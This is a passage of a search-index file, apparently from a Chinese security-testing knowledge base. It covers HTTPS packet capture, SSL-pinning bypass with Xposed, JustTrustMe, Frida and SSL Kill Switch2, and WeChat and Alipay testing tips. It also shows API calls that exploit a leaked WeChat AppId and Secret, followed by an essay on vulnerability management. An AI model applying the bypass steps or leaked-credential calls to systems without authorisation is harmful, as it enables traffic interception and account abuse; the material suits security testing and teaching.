\u5c06\u5bfc\u51fa\u7684\u8bc1\u4e66\u5b89\u88c5\u5230\u624b\u673a\u6216\u6d4f\u89c8\u5668\u4e2d\uff1b \u7ed5\u8fc7\u8bc1\u4e66\u7684SSL Pinning xposed + Just Trust Me \u5907\u6ce8\uff1amac\u7535\u8111\u5347\u7ea7\u5230Majave\u7248\u672c\u540e\uff0c\u591c\u795e\u6a21\u62df\u5668\u6709bug\uff0c\u63a8\u8350\u4f7f\u7528mumu\u6216\u8005Genymotion\u6a21\u62df\u5668\u3002 \u8fd9\u91cc\u8bf4\u4e00\u4e0bmumu\u6a21\u62df\u5668\u5b89\u88c5Xposed+Just Trust Me\u7684\u8fc7\u7a0b\uff1a Xposed\u4e0b\u8f7d\u5730\u5740 Just Trust Me\u4e0b\u8f7d\u5730\u5740 \u5b89\u88c5\u6700\u65b0\u7248\u7684xposed\u6846\u67b6\u4f1a\u62a5\u9519\u5982\u4e0b\uff1a \u9700\u8981\u4f7f\u7528\u5982\u4e0b\u7248\u672c\u7684xposed\uff1a \u4f20\u9001\u95e8 \u5907\u6ce8\uff1amumu\u6a21\u62df\u5668\u9700\u8981\u5728\u8bbe\u7f6e--\u5e94\u7528\u517c\u5bb9\u6027--\u5173\u95ed \u5b89\u88c5\u5b8c\u6210\u5982\u56fe\u6240\u793a\uff1a frida\u7ed5\u8fc7 IOS\u7ed5\u8fc7SSL Pinning \u624b\u673a\u8d8a\u72f1\u540e\uff0c\u4f7f\u7528SSL Kill Switch2 ssl-kill-switch2\u4e0b\u8f7d\u5730\u5740 \u53c2\u8003\u8d44\u6599 \u7a81\u7834https-https\u6293\u5305","title":"https\u6293\u5305"},{"location":"application-security/security-testing/tools-skills/capture-https/#https","text":"","title":"https\u6293\u5305"},{"location":"application-security/security-testing/tools-skills/capture-https/#_1","text":"burpsuite fiddler charles","title":"\u5e38\u7528\u6293\u5305\u5de5\u5177"},{"location":"application-security/security-testing/tools-skills/capture-https/#https_1","text":"","title":"https\u5355\u5411\u8ba4\u8bc1\u4e0e\u53cc\u5411\u8ba4\u8bc1"},{"location":"application-security/security-testing/tools-skills/capture-https/#https_2","text":"","title":"\u5982\u4f55\u6293\u53d6https\u7684\u5305"},{"location":"application-security/security-testing/tools-skills/capture-https/#app","text":"\u4e0d\u5bf9\u8bc1\u4e66\u505a\u4e25\u91cd\uff0c\u76f4\u63a5\u901a\u8fc7\u4ee3\u7406\u5c31\u53ef\u4ee5\u6293\u5305\uff1b","title":"\u63a5\u53d7\u6240\u6709\u8bc1\u4e66\u7684app"},{"location":"application-security/security-testing/tools-skills/capture-https/#app_1","text":"\u5c06\u4ee3\u7406\u5de5\u5177\u7684\u8bc1\u4e66\u5bfc\u51fa\u4e3acer\u683c\u5f0f\uff1b \u5c06\u5bfc\u51fa\u7684\u8bc1\u4e66\u5b89\u88c5\u5230\u624b\u673a\u6216\u6d4f\u89c8\u5668\u4e2d\uff1b","title":"\u4f7f\u7528\u7cfb\u7edf\u8bc1\u4e66\u8fdb\u884c\u6821\u9a8c\u7684app"},{"location":"application-security/security-testing/tools-skills/capture-https/#ssl-pinning","text":"xposed + Just Trust Me \u5907\u6ce8\uff1amac\u7535\u8111\u5347\u7ea7\u5230Majave\u7248\u672c\u540e\uff0c\u591c\u795e\u6a21\u62df\u5668\u6709bug\uff0c\u63a8\u8350\u4f7f\u7528mumu\u6216\u8005Genymotion\u6a21\u62df\u5668\u3002 \u8fd9\u91cc\u8bf4\u4e00\u4e0bmumu\u6a21\u62df\u5668\u5b89\u88c5Xposed+Just Trust Me\u7684\u8fc7\u7a0b\uff1a Xposed\u4e0b\u8f7d\u5730\u5740 Just Trust Me\u4e0b\u8f7d\u5730\u5740 \u5b89\u88c5\u6700\u65b0\u7248\u7684xposed\u6846\u67b6\u4f1a\u62a5\u9519\u5982\u4e0b\uff1a \u9700\u8981\u4f7f\u7528\u5982\u4e0b\u7248\u672c\u7684xposed\uff1a \u4f20\u9001\u95e8 \u5907\u6ce8\uff1amumu\u6a21\u62df\u5668\u9700\u8981\u5728\u8bbe\u7f6e--\u5e94\u7528\u517c\u5bb9\u6027--\u5173\u95ed \u5b89\u88c5\u5b8c\u6210\u5982\u56fe\u6240\u793a\uff1a frida\u7ed5\u8fc7","title":"\u7ed5\u8fc7\u8bc1\u4e66\u7684SSL Pinning"},{"location":"application-security/security-testing/tools-skills/capture-https/#iosssl-pinning","text":"\u624b\u673a\u8d8a\u72f1\u540e\uff0c\u4f7f\u7528SSL Kill Switch2 ssl-kill-switch2\u4e0b\u8f7d\u5730\u5740","title":"IOS\u7ed5\u8fc7SSL Pinning"},{"location":"application-security/security-testing/tools-skills/capture-https/#_2","text":"\u7a81\u7834https-https\u6293\u5305","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/security-testing/tools-skills/capture-skills/","text":"\u6293\u5305\u6280\u5de7 \u5fae\u4fe1\u516c\u4f17\u53f7H5\u6293\u5305 \u611f\u8c22CF_HB\u5e08\u5085 \u624b\u673a\u7248\u672c\uff1aAndroid\u7248\u672c 9 \u5fae\u4fe1\u7248\u672c\uff1a7.0 chrome://inspect/#devices http://debugx5.qq.com spy-debugger\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u4e0d\u884c\uff1b \u652f\u4ed8\u5b9d\u5b89\u5168\u4ee3\u7406\u5f00\u5173 \u5173\u95ed\u5b89\u5168\u4ee3\u7406 \u5c06\u94fe\u63a5\u751f\u6210\u4e00\u4e2a\u4e8c\u7ef4\u7801\uff0c\u6211\u8fd9\u91cc\u751f\u6210\u597d\u4e86\uff0c\u4f7f\u7528\u652f\u4ed8\u5b9d\u626b\u63cf\u540e\uff0c\u5173\u95ed\u5b89\u5168\u4ee3\u7406\u3002\u7406\u8bba\u4e0a\u8fd9\u4e2a\u4e1c\u897f\u5173\u4e86\u5c31\u53d8\u6210\u6b63\u5e38\u7684http\u8bf7\u6c42\u4e86\uff0c\u7136\u540e\u5c31\u662f\u7ed5\u8fc7\u5404\u79cd\u68c0\u6d4b\u3002 \u53c2\u8003\u8d44\u6599 \u5fae\u4fe1\u516c\u4f17\u53f7\u6d4b\u8bd5tip\u2014\u2014Chrome\u8c03\u8bd5\u5fae\u4fe1\u516c\u4f17\u53f7H5\u9875\u9762 spy-debugger","title":"\u6293\u5305\u6280\u5de7"},{"location":"application-security/security-testing/tools-skills/capture-skills/#_1","text":"","title":"\u6293\u5305\u6280\u5de7"},{"location":"application-security/security-testing/tools-skills/capture-skills/#h5","text":"\u611f\u8c22CF_HB\u5e08\u5085 \u624b\u673a\u7248\u672c\uff1aAndroid\u7248\u672c 9 \u5fae\u4fe1\u7248\u672c\uff1a7.0 chrome://inspect/#devices http://debugx5.qq.com spy-debugger\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u4e0d\u884c\uff1b","title":"\u5fae\u4fe1\u516c\u4f17\u53f7H5\u6293\u5305"},{"location":"application-security/security-testing/tools-skills/capture-skills/#_2","text":"\u5173\u95ed\u5b89\u5168\u4ee3\u7406 \u5c06\u94fe\u63a5\u751f\u6210\u4e00\u4e2a\u4e8c\u7ef4\u7801\uff0c\u6211\u8fd9\u91cc\u751f\u6210\u597d\u4e86\uff0c\u4f7f\u7528\u652f\u4ed8\u5b9d\u626b\u63cf\u540e\uff0c\u5173\u95ed\u5b89\u5168\u4ee3\u7406\u3002\u7406\u8bba\u4e0a\u8fd9\u4e2a\u4e1c\u897f\u5173\u4e86\u5c31\u53d8\u6210\u6b63\u5e38\u7684http\u8bf7\u6c42\u4e86\uff0c\u7136\u540e\u5c31\u662f\u7ed5\u8fc7\u5404\u79cd\u68c0\u6d4b\u3002","title":"\u652f\u4ed8\u5b9d\u5b89\u5168\u4ee3\u7406\u5f00\u5173"},{"location":"application-security/security-testing/tools-skills/capture-skills/#_3","text":"\u5fae\u4fe1\u516c\u4f17\u53f7\u6d4b\u8bd5tip\u2014\u2014Chrome\u8c03\u8bd5\u5fae\u4fe1\u516c\u4f17\u53f7H5\u9875\u9762 spy-debugger","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/security-testing/tools-skills/information-leakage/","text":"\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e\u5229\u7528 \u5fae\u4fe1AppId\u4e0eSecret\u6cc4\u6f0f \u63a5\u53e3\u8c03\u7528\u8bf7\u6c42\u8bf4\u660e # \u83b7\u53d6token https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential appid=APPID secret=APPSECRET # \u67e5\u8be2\u6240\u6709\u5206\u7ec4 https://api.weixin.qq.com/cgi-bin/groups/get?access_token=ACCESS_TOKEN \u4f7f\u7528\u5b98\u7f51\u63d0\u4f9b\u5e73\u53f0 https://mp.weixin.qq.com/debug/","title":"\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e\u5229\u7528"},{"location":"application-security/security-testing/tools-skills/information-leakage/#_1","text":"","title":"\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e\u5229\u7528"},{"location":"application-security/security-testing/tools-skills/information-leakage/#appidsecret","text":"\u63a5\u53e3\u8c03\u7528\u8bf7\u6c42\u8bf4\u660e # \u83b7\u53d6token https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential appid=APPID secret=APPSECRET # \u67e5\u8be2\u6240\u6709\u5206\u7ec4 https://api.weixin.qq.com/cgi-bin/groups/get?access_token=ACCESS_TOKEN \u4f7f\u7528\u5b98\u7f51\u63d0\u4f9b\u5e73\u53f0 https://mp.weixin.qq.com/debug/","title":"\u5fae\u4fe1AppId\u4e0eSecret\u6cc4\u6f0f"},{"location":"application-security/security-testing/tools-skills/web-tools/","text":"Web\u5b89\u5168\u5de5\u5177 burpsuite sqlmap \u5b98\u7f51\u5730\u5740 \u7528\u6237\u4f7f\u7528\u624b\u518c","title":"Web\u5b89\u5168\u5de5\u5177"},{"location":"application-security/security-testing/tools-skills/web-tools/#web","text":"","title":"Web\u5b89\u5168\u5de5\u5177"},{"location":"application-security/security-testing/tools-skills/web-tools/#burpsuite","text":"","title":"burpsuite"},{"location":"application-security/security-testing/tools-skills/web-tools/#sqlmap","text":"\u5b98\u7f51\u5730\u5740 \u7528\u6237\u4f7f\u7528\u624b\u518c","title":"sqlmap"},{"location":"application-security/vulnerability-management/","text":"\u6f0f\u6d1e\u7ba1\u7406 \u8ba1\u7b97\u673a\u5b89\u5168\u9690\u60a3(vulnerability)\u4fd7\u79f0\u6f0f\u6d1e(security hole)\uff0c\u6307\u8ba1\u7b97\u673a\u7cfb\u7edf\u5b89\u5168\u65b9\u9762\u7684\u7f3a\u9677\uff0c\u4f7f\u5f97\u7cfb\u7edf\u6216\u5176\u5b83\u5e94\u7528\u6570\u636e\u7684\u4fdd\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u3001\u53ef\u7528\u6027\u3001\u8bbf\u95ee\u63a7\u5236\u548c\u76d1\u6d4b\u673a\u5236\u7b49\u9762\u4e34\u5a01\u80c1\u3002 \u6f0f\u6d1e\u7ba1\u7406\u5c31\u662f\u9886\u5148\u6f0f\u6d1e\u4e00\u6b65\uff0c\u8ba9\u4fee\u590d\u66f4\u9891\u7e41\u66f4\u6709\u6548\u7684\u4e00\u4e2a\u8fc7\u7a0b\u3002 \u5f53\u516c\u53f8\u4e1a\u52a1\u8f83\u5c11\u65f6\uff0c\u4e00\u4e2a\u8868\u683c\u5c31\u53ef\u4ee5\u5904\u7406\u5b8c\u6f0f\u6d1e\u7ba1\u7406\u7684\u6d41\u7a0b\u3002\u4f46\u662f\u5f53\u4e1a\u52a1\u7cfb\u7edf\u589e\u591a\uff0c\u5b89\u5168\u62a5\u544a\u589e\u5927\u65f6\u5c31\u9700\u8981\u4e00\u4e2a\u597d\u7684\u6f0f\u6d1e\u7ba1\u7406\u5de5\u5177\u6765\u8fdb\u884c\u7ba1\u7406\u3002 \u629b\u4e00\u4e2a\u95ee\u9898\uff1a\u5b89\u5168\u6d4b\u8bd5\u56e2\u961f\u5230\u5e95\u5e94\u4e0d\u5e94\u8be5\u4e3a\u6f0f\u6d1e\u6570\u91cf\u8d1f\u8d23\uff0c\u5982\u679c\u9700\u8981\u8d1f\u8d23\uff0c\u90a3\u4e48\u591a\u597d\u8fd8\u662f\u5c11\u597d\uff1f \u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7ba1\u7406 \u6f0f\u6d1e\u7684\u6765\u6e90 \u5185\u90e8\u5b89\u5168\u56e2\u961f\u53d1\u73b0\uff1a\u901a\u8fc7\u5b89\u5168\u626b\u63cf\u3001\u5b89\u5168\u6d4b\u8bd5\u7b49\u624b\u6bb5\u53d1\u73b0\u6f0f\u6d1e\uff1b \u5185\u90e8\u975e\u5b89\u5168\u56e2\u961f\u53d1\u73b0\uff1a\u5de5\u4f5c\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u7684\u5b89\u5168\u95ee\u9898\uff1b \u5916\u90e8\u53d1\u73b0\uff1a\u4f17\u6d4b\u5e73\u53f0\u3001\u5b89\u5168\u670d\u52a1\u3001\u4e2a\u4eba\u63d0\u4ea4\uff1b \u6f0f\u6d1e\u7ba1\u7406\u7684\u95ee\u9898 \u6f0f\u6d1e\u5982\u4f55\u4e0e\u5177\u4f53\u4e1a\u52a1\u5173\u8054 \u5f53\u516c\u53f8\u89c4\u6a21\u8f83\u5c0f\u6c9f\u901a\u9760\u55d3\u95e8\u7684\u65f6\u5019\u4e0d\u7528\u8003\u8651\u8fd9\u4e2a\u95ee\u9898\uff0c\u800c\u4e14\u4e1a\u52a1\u56e2\u961f\u5212\u5206\u4e5f\u6ca1\u6709\u5f88\u6e05\u6670\u6240\u4ee5\u8fd9\u4e2a\u65f6\u5019\u53ef\u4ee5\u76f4\u63a5\u4e22\u7ed9\u4e1a\u52a1\u65b9\u8ba9\u4ed6\u4eec\u5b89\u6392\u4fee\u590d\u3002\u5f53\u516c\u53f8\u8fbe\u5230\u4e00\u5b9a\u89c4\u6a21\u4e1a\u52a1\u589e\u591a\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5982\u679c\u5355\u7eaf\u4f9d\u9760\u4eba\u529b\u6765\u627e\u6f0f\u6d1e\u5c5e\u4e8e\u54ea\u4e2a\u4e1a\u52a1\u662f\u5f88\u8d39\u529b\u7684\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5176\u5b9e\u5f88\u9700\u8981\u5b89\u5168\u7684\u8d44\u4ea7\u7ba1\u7406\u6765\u76f4\u63a5\u5b9a\u4f4d\u5230\u4e1a\u52a1\u65b9\uff0c\u518d\u6765\u627e\u5230\u5173\u8054\u7684\u4eba\uff0c\u5f53\u7136\u5b89\u5168\u8d44\u4ea7\u7ba1\u7406\u4e0d\u662f\u672c\u7bc7\u7684\u8ba8\u8bba\uff0c\u540e\u9762\u4f1a\u6709\u4e00\u7bc7\u4e13\u95e8\u6765\u4ecb\u7ecd\u3002 \u89e3\u51b3\u65b9\u6848\uff1a\u6f0f\u6d1e\u7ba1\u7406\u7cfb\u7edf\u4e0e\u8d44\u4ea7\u7ba1\u7406\u7cfb\u7edf\u90e8\u5206\u6570\u636e\u6253\u901a\u3002 \u786e\u4fdd\u6f0f\u6d1e\u4fee\u590d\u5b8c\u6210 \u5728\u5f88\u591a\u516c\u53f8\u9047\u5230\u8fc7\u4e00\u4e2a\u60c5\u51b5\uff1a\u4e25\u91cd\u9ad8\u5371\u7684\u6f0f\u6d1e\u8fd8\u597d\uff0c\u4f46\u662f\u7ecf\u5e38\u51fa\u73b0\u4e2d\u4f4e\u5371\u7684\u6f0f\u6d1e\u63d0\u4ea4\u4e00\u4e2a\u6708\u751a\u81f3\u534a\u5e74\u6ca1\u6709\u4fee\u590d\u3002 \u89e3\u51b3\u65b9\u6848\uff1a\u5b89\u5168\u8bed\u4e1a\u52a1\u7edf\u4e00\u5236\u5b9a\u4e00\u4e2a\u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7ba1\u7406\u6807\u51c6\uff0c\u4e0d\u540c\u7b49\u7ea7\u7684\u6f0f\u6d1e\u4fee\u590d\u65f6\u95f4\u662f\u591a\u4e45\u3002 \u6f0f\u6d1e\u62a5\u544a\u7684\u7559\u5b58 \u4f01\u4e1a\u5185\u90e8\u9700\u8981\u5bf9\u6f0f\u6d1e\u6709\u4e00\u4e2a\u6e05\u6670\u7684\u6574\u7406\u5f52\u6863\u6765\u4f5c\u4e3a\u6570\u636e\u7eac\u5ea6\u5c55\u793a\u516c\u53f8\u5b89\u5168\u53d1\u5c55\u7684\u72b6\u6001\u3002\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u53d1\u73b0\u6f0f\u6d1e\u9700\u8981\u90ae\u4ef6\u7ed9\u4e1a\u52a1\u65b9\uff0c\u5e76\u4e14\u9700\u8981\u4f7f\u7528Excel\u6765\u603b\u7ed3\uff0c\u5f53\u6d4b\u8bd5\u4eba\u5458\u5f88\u591a\u65f6\uff0c\u8fd8\u9700\u8981\u505a\u4e00\u4e2a\u6c47\u603b\uff0c\u8fd9\u4e9b\u90fd\u4f1a\u9020\u6210\u66f4\u591a\u7684\u4e0d\u4fbf\u3002 \u89e3\u51b3\u65b9\u6848\uff1a\u6f0f\u6d1e\u7ba1\u7406\u5e73\u53f0\u9700\u8981\u5bf9\u4e0d\u540c\u65f6\u95f4\u6bb5\u63d0\u4ea4\u7684\u4e0d\u540c\u6f0f\u6d1e\u7b49\u7ea7\u8fdb\u884c\u6570\u636e\u91cf\u5316\u3002 \u540c\u4e00\u4e2a\u4e1a\u52a1\u56e2\u961f\u8d1f\u8d23\u7684\u4ea7\u54c1\u4e2d\u591a\u6b21\u51fa\u73b0\u540c\u6837\u7684\u6f0f\u6d1e \u89e3\u51b3\u65b9\u6848\uff1a\u4e1a\u52a1\u56e2\u961f\u81ea\u8eab\u7684\u4e0d\u65ad\u6574\u7406\u4e0e\u603b\u7ed3\uff0c\u5b89\u5168\u56e2\u961f\u5bf9\u4e1a\u52a1\u56e2\u961f\u8fdb\u884c\u5b89\u5168\u57f9\u8bad\uff08\u53ef\u4ee5\u7ed3\u5408\u5728SDL\u4e2d\u8fdb\u884c\uff09\u3002 \u6f0f\u6d1e\u5ba1\u6838\u4eba\u529bDoS \u5982\u679c\u4f01\u4e1a\u5728\u4e00\u4e9b\u7c7b\u4f3cSRC\u7684\u5e73\u53f0\uff0c\u7531\u4e8e\u76ee\u524d\u767d\u5e3d\u5b50\u6c34\u5e73\u5c42\u6b21\u4e0d\u9f50\uff0c\u7ecf\u5e38\u4f1a\u63d0\u4ea4\u4e00\u4e9bbug\u4f5c\u4e3a\u6f0f\u6d1e\uff0c\u6216\u8005\u6545\u610f\u63d0\u9ad8\u6f0f\u6d1e\u7b49\u7ea7\uff0cSRC\u5e73\u53f0\u5728\u5904\u7406\u8fd9\u4e9b\u65f6\u4e0e\u767d\u5e3d\u5b50\u53d1\u751f\u4e89\u6267\u4ea7\u751f\u7684\u4eba\u529b\u6d88\u8017\u3002 \u89e3\u51b3\u65b9\u6848\uff1a\u5f85\u89e3\u51b3 \u6f0f\u6d1e\u7ba1\u7406\u7684\u601d\u8003 \u5b89\u5168\u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7684\u7406\u89e3 \u539f\u6587\u5730\u5740 \u5907\u6ce8\uff1a\u672c\u8282\u5185\u5bb9\u5f15\u7528\u81ea\u5b89\u5168\u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7684\u7406\u89e3\uff0c\u975e\u539f\u521b \u4ece\u4ea7\u54c1\u89d2\u5ea6\u7406\u89e3\u5b89\u5168\u6f0f\u6d1e\u751f\u547d\u5468\u671f \u6f0f\u6d1e\u53d1\u73b0\uff1a\u901a\u8fc7\u4eba\u5de5\u6216\u8005\u81ea\u52a8\u5316\u7b49\u65b9\u5f0f\u5206\u6790\u3001\u6316\u6398\u51fa\u6f0f\u6d1e\u7684\u8fc7\u7a0b\uff0c\u5e76\u4e14\u8be5\u6f0f\u6d1e\u53ef\u4ee5\u88ab\u9a8c\u8bc1\u548c\u91cd\u73b0\uff1b \u6f0f\u6d1e\u5229\u7528\uff1a\u5229\u7528\u6f0f\u6d1e\u5bf9\u8ba1\u7b97\u673a\u4fe1\u606f\u7cfb\u7edf\u7684\u4fdd\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u548c\u53ef\u7528\u6027\u9020\u6210\u635f\u5bb3\u7684\u8fc7\u7a0b\uff1b \u6f0f\u6d1e\u4fee\u590d\uff1a\u901a\u8fc7\u8865\u4e01\u3001\u5347\u7ea7\u7248\u672c\u6216\u914d\u7f6e\u7b56\u7565\u7b49\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u4fee\u8865\u7684\u8fc7\u7a0b\uff0c\u4f7f\u5f97\u8be5\u6f0f\u6d1e\u4e0d\u80fd\u591f\u88ab\u6076\u610f\u4e3b\u9898\u6240\u5229\u7528\uff1b \u6f0f\u6d1e\u516c\u5f00\uff1a\u901a\u8fc7\u516c\u5f00\u6e20\u9053\uff08\u5982\uff1a\u7f51\u7ad9\u3001\u90ae\u4ef6\u5217\u8868\u7b49\uff09\uff1b \u4ece\u4fe1\u606f\u7cfb\u7edf\u89d2\u5ea6\u7406\u89e3\u5b89\u5168\u6f0f\u6d1e\u751f\u547d\u5468\u671f \u6f0f\u6d1e\u8bc6\u522b\uff1a\u901a\u8fc7\u81ea\u8eab\u6d4b\u8bd5\u3001\u76d1\u63a7\u3001\u5916\u90e8\u7b2c\u4e09\u65b9\u901a\u62a5\u3001\u5ba2\u6237\u6295\u8bc9\u7b49\u65b9\u5f0f\uff0c\u83b7\u77e5\u6f0f\u6d1e\u7684\u5b58\u5728\uff1b \u6f0f\u6d1e\u8bc4\u4f30\uff1a\u901a\u8fc7\u81ea\u8eab\u6d4b\u8bd5\u3001\u76d1\u63a7\u3001\u5916\u90e8\u7b2c\u4e09\u65b9\u901a\u62a5\u3001\u5ba2\u6237\u6295\u8bc9\u7b49\u65b9\u5f0f\uff0c\u83b7\u77e5\u6f0f\u6d1e\u7684\u5b58\u5728\uff1b \u6f0f\u6d1e\u901a\u62a5\uff1a\u5b89\u5168\u7ba1\u7406\u8005\u5c06\u6f0f\u6d1e\u4fe1\u606f\u548c\u4fee\u590d\u5efa\u8bae\u5185\u90e8\u901a\u62a5\u7ed9\u4fe1\u606f\u7cfb\u7edf\u7ef4\u62a4/\u5e94\u7528/\u5f00\u53d1\u7b49\u76f8\u5173\u4eba\u5458\uff1b \u6f0f\u6d1e\u6d4b\u8bd5\uff1a\u4fe1\u606f\u7cfb\u7edf\u76f8\u5173\u4eba\u5458\u5bf9\u7cfb\u7edf\u6f0f\u6d1e\u4fee\u8865\u8fdb\u884c\u6d4b\u8bd5\uff1b \u6f0f\u6d1e\u4fee\u590d\uff1a\u4fe1\u606f\u7cfb\u7edf\u76f8\u5173\u4eba\u5458\u5bf9\u7cfb\u7edf\u6f0f\u6d1e\u8fdb\u884c\u4fee\u590d\uff1b \u6f0f\u6d1e\u56de\u9000\uff1a\u6f0f\u6d1e\u7684\u4fee\u590d\u82e5\u5f71\u54cd\u4e1a\u52a1\uff0c\u5bf9\u4fee\u590d\u8fdb\u884c\u56de\u9000\uff0c\u591a\u65b9\u91cd\u65b0\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u8bc4\u4f30\uff0c\u751a\u81f3\u63a5\u53d7\u8be5\u6f0f\u6d1e\uff1b \u4ece\u5b89\u5168\u653b\u9632\u89d2\u5ea6\u7406\u89e3\u5b89\u5168\u6f0f\u6d1e\u751f\u547d\u5468\u671f \u6f0f\u6d1e\u7814\u7a76\u4e0e\u6316\u6398\uff1a\u5229\u7528\u6e90\u4ee3\u7801\u5ba1\u6838\uff08\u767d\u76d2\u6d4b\u8bd5\uff09\u3001\u9006\u5411\u5de5\u7a0b\uff08\u7070\u76d2\u6d4b\u8bd5\uff09\u3001Fuzz\u6d4b\u8bd5\uff08\u9ed1\u76d2\u6d4b\u8bd5\uff09\u3001\u6d41\u91cf\u5206\u6790\uff08\u9ed1\u76d2\u6d4b\u8bd5\uff09\u7b49\u65b9\u6cd5\uff1b POC/EXP\u5f00\u53d1\u4e0e\u6d4b\u8bd5\uff1a\u5f00\u53d1\u6982\u5ff5\u9a8c\u8bc1\u6027\u6e17\u900f\u653b\u51fb\u4ee3\u7801\uff08POC\uff09\u6216\u6f0f\u6d1e\u653b\u51fb\u5229\u7528\u4ee3\u7801\uff08EXP\uff09\uff0c\u5e76\u6d4b\u8bd5\u6f0f\u6d1e\u662f\u5426\u53ef\u88ab\u5229\u7528\uff1b \u901a\u62a5\u5382\u5546\u6216\u5c0f\u89c4\u6a21\u6d41\u4f20\uff1a\u767d\u5e3d\u5b50\u901a\u77e5\u5382\u5546\u8fdb\u884c\u4fee\u8865\uff0c\u7ed9\u51fa\u8865\u4e01\u540e\u516c\u5e03\uff1b\u9ed1\u5e3d\u5b50\u5728\u5c01\u95ed\u5c0f\u89c4\u6a21\u56e2\u961f\u5171\u4eab\u6d41\u4f20\uff1b \u6f0f\u6d1e\u6269\u6563\uff1a\u6f0f\u6d1ePOC\u6216EXP\u4ee3\u7801\u5728\u4e92\u8054\u7f51\u4e0a\u516c\u5e03\uff0c\u5927\u4f17\u9ed1\u5e3d\u5b50\u5feb\u901f\u638c\u63e1\u3001\u5e94\u7528\u548c\u4f20\u64ad\u6269\u6563\uff1b \u653b\u51fb\u5de5\u5177/\u6076\u610f\u7a0b\u5e8f\u4f20\u64ad\uff1a\u5f00\u53d1\u51fa\u81ea\u52a8\u5316\u653b\u51fb\u5de5\u5177/\u6076\u610f\u7a0b\u5e8f\uff0c\u5728\u4e92\u8054\u7f51\u8fdb\u884c\u4f20\u64ad\u3002\u5382\u5546\u5b8c\u6210\u8865\u4e01\u7a0b\u5e8f\u5f00\u53d1\u548c\u6d4b\u8bd5\u5e76\u8fdb\u884c\u53d1\u5e03\uff1b \u5927\u89c4\u6a21\u4f20\u64ad\uff1a\u5382\u5546\u53d1\u5e03\u8865\u4e01\u7a0b\u5e8f\u548c\u5b89\u5168\u8b66\u62a5\uff0c\u6e17\u900f\u4ee3\u7801/\u6076\u610f\u7a0b\u5e8f\u5927\u89c4\u6a21\u4f20\u64ad\u5371\u5bb3\u4e92\u8054\u7f51\uff1b \u6f0f\u6d1e/\u653b\u51fb\u4ee3\u7801\u9010\u6e10\u6d88\u4ea1\uff1a\u5728\u5382\u5546\u8865\u4e01\u7a0b\u5e8f\u5e7f\u6cdb\u5e94\u7528\u540e\uff0c\u76f8\u5e94\u7684\u6f0f\u6d1e\u6e17\u900f\u4ee3\u7801/\u6076\u610f\u7a0b\u5e8f\u9010\u6e10\u629b\u5f03\u4ece\u800c\u6d88\u4ea1\uff1b \u6211\u7684\u4e00\u4e9b\u601d\u8003 \u5bf9\u4e8e\u4f01\u4e1a\uff0c\u6211\u4eec\u5e94\u8be5\u5173\u6ce8\u4e0e\u4f01\u4e1a\u5185\u90e8\u76f8\u5173\uff0c\u751a\u81f3\u5173\u6ce8\u6211\u4eec\u6240\u4f7f\u7528\u7684\u4ea7\u54c1\u3001\u670d\u52a1\u76f8\u5173\u7684\u6f0f\u6d1e\u3002\u4ece\u6f0f\u6d1e\u7206\u53d1\u3001\u6f0f\u6d1e\u4f20\u64ad\u3001\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\u4f20\u64ad\u5230\u6f0f\u6d1e\u4fee\u590d\u6574\u4e2a\u6d41\u7a0b\u4e2d\uff0c\u6211\u4eec\u5e94\u8be5\u601d\u8003\u5982\u4e0b\u51e0\u4e2a\u95ee\u9898\uff1a \u5982\u4f55\u5feb\u901f\u83b7\u53d6\u6f0f\u6d1e\u60c5\u62a5\uff1a\u722c\u866b\u3001\u60c5\u62a5\u7fa4\u3001\u793e\u533a\u7f51\u7ad9\u7b49\uff1b \u6f0f\u6d1e\u60c5\u62a5\u5982\u4f55\u8bc4\u4f30\u5f71\u54cd\uff1a\u516c\u53f8\u5185\u6709\u591a\u5c11\u4e1a\u52a1\u53d7\u5230\u5f71\u54cd\uff1b \u6f0f\u6d1e\u5229\u7528\u7206\u53d1\u65f6\u7684\u89e3\u51b3\u65b9\u6848\uff1a\u6f0f\u6d1e\u8be6\u60c5\u662f\u5426\u6709\u7ed9\u51fa\u4e34\u65f6\u89e3\u51b3\u65b9\u6848\uff1b\u6ca1\u6709\u4e34\u65f6\u89e3\u51b3\u65b9\u6848\u5982\u4f55\u63a7\u5236\u98ce\u9669\uff1b \u6f0f\u6d1e\u4fee\u590d\u65f6\u7684\u98ce\u9669\u8bc4\u4f30\uff1a\u4fee\u590d\u65b9\u6848\u5bf9\u4e1a\u52a1\u5f71\u54cd\u662f\u5426\u53ef\u4ee5\u63a5\u53d7\uff1b \u6f0f\u6d1e\u4fee\u590d\u5b8c\u6210\u5982\u4f55\u505a\u5230\u6301\u7eed\u76d1\u63a7\uff1a\u9632\u6b62\u6f0f\u6d1e\u7684\u91cd\u590d\u51fa\u73b0\uff1b \u4e59\u65b9\u4ea7\u54c1\u7684\u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7ba1\u7406 \u5f00\u6e90\u4ea7\u54c1\u7684\u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7ba1\u7406 \u53c2\u8003\u8d44\u6599 \u7532\u65b9\u4f01\u4e1a\u6f0f\u6d1e\u7ba1\u7406\u6d3b\u52a8\u768450\u4e2a\u75db\u70b9\u603b\u7ed3 \u6f0f\u6d1e\u7ba1\u7406\u7684\u5b9a\u4e49\u4e0e\u6700\u4f73\u5b9e\u8df5 The Five Stages of Vulnerability Management 